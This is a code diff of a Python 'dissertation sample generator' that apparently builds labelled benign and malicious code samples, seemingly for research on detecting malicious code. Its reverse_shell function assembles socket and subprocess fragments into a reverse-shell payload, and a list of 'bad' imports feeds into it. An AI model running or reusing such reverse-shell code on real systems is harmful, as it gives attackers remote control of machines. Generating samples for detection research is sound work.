@@ -1,15 +1,15 @@
-###############################################################################
-### Dissertation Sample Generator                                           ###
-### Written by: Adam Barns                                                  ###
-###                                                                         ###
-### info: Throughout this program the list variable 'choices' is used       ###
-### purposely to show where the final list is being traced through the      ###
-### code.                                                                   ###
-###                                                                         ###
-### Function usage:                                                         ###
-### decorator unpacker: <- type(2D array) -> returns(type(str))             ###
-### combinor: <- list of lists to concatinate -> concatinated type(list)    ###     
-###############################################################################
+###################################################################################
+### Dissertation Sample Generator                                               ###
+### Written by: Adam Barns                                                      ###
+###                                                                             ###
+### info: Throughout this program the list variable 'choices' is used           ###
+### purposely to show where the final list is being traced through the          ###
+### code.                                                                       ###
+###                                                                             ###
+### Function usage:                                                             ###
+### decorator unpacker: <- type(2D array) -> returns(type(str))                 ###
+### combinor: <- list of lists to concatinate -> concatinated type(list)        ###     
+###################################################################################
 import random
 import types
 import ast, re
@@ -62,6 +62,7 @@ def unpacker(func, *args, **kwargs):
         print("Something went wrong in the unpacker!!")
 
 
+# Built to optimise unpacker 1
 def unpacker2(*args, **kwargs):
     '''takes in a function that contains a list/s (up to a 2D aaray) 
     and then processes the list/s into a return string. Intended to 
@@ -135,42 +136,41 @@ def logical_equivilance_engine():
     pass 
 
 
-def random_good_imports():
+def random_good_imports() -> list:
     choices = [
-        "import math",
-        "import readline",
-        "import re",
-        "import difflib",
-        "import textwrap",
-        "import stringprep",
-        "import datetime",
-        "import array"
+        "import math\n",
+        "import readline\n",
+        "import re\n",
+        "import difflib\n",
+        "import textwrap\n",
+        "import stringprep\n",
+        "import datetime\n",
+        "import array\n"
     ]
     r = random.randint(1, len(choices))
     return(random.sample(choices, k=r))
 
 
-def random_bad_imports():
+def random_bad_imports() -> list:
     choices = [
-        "import zlib",
-        "import gzip",
-        "import bz2",
-        "import lzma",
-        "import zipfile",
-        "import tarfile",
-        "import hashlib",
-        "import hmac",
-        "import threading",
-        "import crypt", 
+        "import zlib\n",
+        "import gzip\n",
+        "import bz2\n",
+        "import lzma\n",
+        "import zipfile\n",
+        "import tarfile\n",
+        "import hashlib\n",
+        "import hmac\n",
+        "import threading\n",
+        "import crypt\n", 
     ]
     r = random.randint(1, len(choices))
     return(random.sample(choices, k=r))
 
 
-## TODO this does nothing
-def imports (good_bad_choice, requirements):
-    for i in requirements:
-        choices = requirements[i]
+def imports (good_bad_choice: list, requirements: list) -> list:
+    choices = good_bad_choice + requirements
+    random.shuffle(choices)
     return(choices)    
 
 
@@ -229,7 +229,7 @@ def non_infinite_loops(passed, count = 1, upperlimit = 6) -> list:
 
 
 @unpacker
-def reverse_shell():
+def reverse_shell() -> list:
     required_imports = ['import socket\n', 'import subprocess\n']
     required_components = [
         's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n',
@@ -242,7 +242,7 @@ def reverse_shell():
         '\ts.send(data)\n'
     ]
     choices = combiner(
-        required_imports, 
+        imports(random_bad_imports(),required_imports), 
         required_components,
         infinite_loops,
         required_nests
@@ -250,7 +250,9 @@ def reverse_shell():
     return(choices)
 
 
-if __name__ == "__main__":    
+if __name__ == "__main__":  
+    ### TEST THAT I HAVEN@T BROKEN ANYTHING
+    print(reverse_shell)  
     ### global variables necessary for __main__ namespace.
     SAMPLE_SIZE = 1
     good_or_bad = ["good", "bad"]
@@ -263,7 +265,7 @@ if __name__ == "__main__":
                 good_payloads = []  ## good payload choices.
                 #good_choices = random.choice(good_payloads)
             elif i == "bad":
-                bad_payloads = [reverse_shell, ]  ## bad payload choices.
+                bad_payloads = [reverse_shell, ]  ## bad payload choices.         
                 bad_choices = random.choice(bad_payloads)
             else: 
                 print("error: there is a problem with initialisation")
@@ -281,7 +283,6 @@ if __name__ == "__main__":
     # x = infinite_loops()
     # print(x)
     # reverseShell()
-    # print(reverse_shell)
     # print(random_good_imports())
     # print(random_bad_imports())
     # print(1 + True)
@@ -335,17 +336,20 @@ if __name__ == "__main__":
     # except:
     #     print("foo's strings can't do that")
 
-    @unpacker
-    def bar():
-        # var = multiply_some_shit(10, 50)
-        # var = foo(10, 20)
-        string = [
-            '\tprint("I\'m a winner!!")\n',
-            '\tprint("I hope this works")\n'
-        ]
-        var = non_infinite_loops(string, 1, 10)
-        # print(f"this is stored at var: {var}")
-        return(var)
+    # # @unpacker
+    # # def bar():
+    # #     # var = multiply_some_shit(10, 50)
+    # #     # var = foo(10, 20)
+    # #     string = [
+    # #         '\tprint("I\'m a winner!!")\n',
+    # #         '\tprint("I hope this works")\n'
+    # #     ]
+    # #     var = non_infinite_loops(string, 1, 10)
+    # #     # print(f"this is stored at var: {var}")
+    # #     return(var)
 
     # # print(foo(50, 100))
-    print(bar)
+    # # print(bar)
+    # requirements = ['a', 'b', 'c', 'd']
+    # print(random_good_imports())
+    # print(imports(random_good_imports(), requirements))
